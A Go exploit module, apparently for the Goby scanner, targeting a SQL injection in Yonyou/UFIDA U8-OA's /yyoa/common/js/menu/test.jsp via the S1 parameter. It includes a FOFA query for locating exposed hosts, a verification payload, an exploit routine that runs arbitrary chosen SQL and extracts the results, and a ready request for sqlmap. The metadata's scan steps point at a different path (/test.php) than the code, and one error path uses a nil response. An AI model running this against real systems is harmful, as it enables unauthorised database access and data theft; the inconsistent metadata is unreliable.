package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "UFIDA U8-OA /test.jsp SQL Injection Vulnerability",
    "Description": "<p>U8-OA (U8 collaborative office software) isdesigned for the management of a wide range of enterprises and institutions. Itis an efficient collaborative work platform based on the Internet. The U8 OAtest.jsp file of U8 has a SQL injection vulnerability. The s1 parameter is notfiltered, which leads to SQL injection. Attackers can access the data in thedatabase without authorization and cause damage to the system.</p>",
    "Product": "yonyou-U8",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-09-14",
    "Author": "2826161446@qq.com",
    "FofaQuery": "title=\"用友U8-OA\" && body=\"用友U8-OA\"",
    "GobyQuery": "title=\"用友U8-OA\" && body=\"用友U8-OA\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability inthe UFIDA U8 OA test.jsp file. The s1 parameter is not filtered, which leads toSQL injection. Attackers can access data in the database without authorizationand cause damage to the system.</p>",
    "Recommendation": "<p>1. Reduce or avoid string concatenation toexecute SQL, and instead pass user input as a parameter to the SQL executionmethod   </p><p>2.Verify the value entered by the user</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "version()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "用友U8-OA /test.jsp SQL 注入漏洞",
            "Product": "用友-U8",
            "Description": "<p>用友U8-OA(U8协同办公软件)，面向广大的企事业组织管理而设计，是基于互联网的高效协同工作平台。用友 U8 OA test.jsp文件存在 SQL注入漏洞，其s1参数未做过滤导致sql注入，攻击者未经授权可以访问数据库中的数据，对系统造成破坏。</p>",
            "Recommendation": "<p>1.减少使用或不使用字符串拼接的方式执行SQL，而是将用户输入当着参数传给执行SQL的方法&nbsp;</p><p>&nbsp;2.对用户输入的值进行校验<br></p>",
            "Impact": "<p>用友 U8 OA test.jsp文件存在 SQL注入漏洞，其s1参数未做过滤导致sql注入，攻击者未经授权可以访问数据库中的数据，对系统造成破坏。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "两高一弱",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "UFIDA U8-OA /test.jsp SQL Injection Vulnerability",
            "Product": "yonyou-U8",
            "Description": "<p>U8-OA (U8 collaborative office software) isdesigned for the management of a wide range of enterprises and institutions. Itis an efficient collaborative work platform based on the Internet. The U8 OAtest.jsp file of U8 has a SQL injection vulnerability. The s1 parameter is notfiltered, which leads to SQL injection. Attackers can access the data in thedatabase without authorization and cause damage to the system.<br></p>",
            "Recommendation": "<p>1. Reduce or avoid string concatenation toexecute SQL, and instead pass user input as a parameter to the SQL executionmethod &nbsp;&nbsp;</p><p>2.Verify the value entered by the user<br></p>",
            "Impact": "<p>There is a SQL injection vulnerability inthe UFIDA U8 OA test.jsp file. The s1 parameter is not filtered, which leads toSQL injection. Attackers can access data in the database without authorizationand cause damage to the system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "2H1W",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9954"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}

		rawPayload := fmt.Sprintf("(SELECT (%s) )", sql)
		urlget := "/yyoa/common/js/menu/test.jsp?doType=101&S1=" + url.QueryEscape(rawPayload)
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/yyoa/common/js/menu/test.jsp"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "qvjzq1qbzxq"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "CONCAT(CONCAT(0x71766a7a71,(CASE WHEN (4247=4247) THEN 0x31 ELSE 0x30 END)),0x71627a7871)"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `<td align="left">([\s\S]*)<\/td>`
			//
			//makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			//	reRequest := regexp.MustCompile(RegularUrl)
			//	if !reRequest.MatchString(RegularContent) {
			//		return "", fmt.Errorf("can't match value")
			//	}
			//	getname := reRequest.FindStringSubmatch(RegularContent)
			//	return getname[1], nil
			//}

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT version()) HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Accept-Encoding: gzip, deflate\n" +
				"Accept-Language: zh-CN,zh;q=0.9\n" +
				"Upgrade-Insecure-Requests: 1\n\n"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `<td align=left>([\s\S]*)<\/td>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
